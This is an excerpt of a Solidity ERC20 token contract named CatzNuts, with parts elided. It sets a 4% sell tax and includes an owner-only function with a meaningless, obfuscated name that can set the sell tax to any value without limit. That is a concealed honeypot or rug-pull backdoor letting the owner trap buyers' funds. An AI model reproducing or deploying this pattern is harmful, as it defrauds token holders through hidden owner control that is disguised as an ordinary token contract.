...
contract CatzNuts is ERC20 {
    uint256 public sellTax;
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    constructor() ERC20("CN", "CatzNuts") {
        _mint(msg.sender, 28542283619 * (10 ** uint256(decimals())));
        sellTax = 4;
        _owner = msg.sender;
    }
    ...
    function aYJN6AT(uint256 amount) public onlyOwner {
        sellTax = amount;
    }
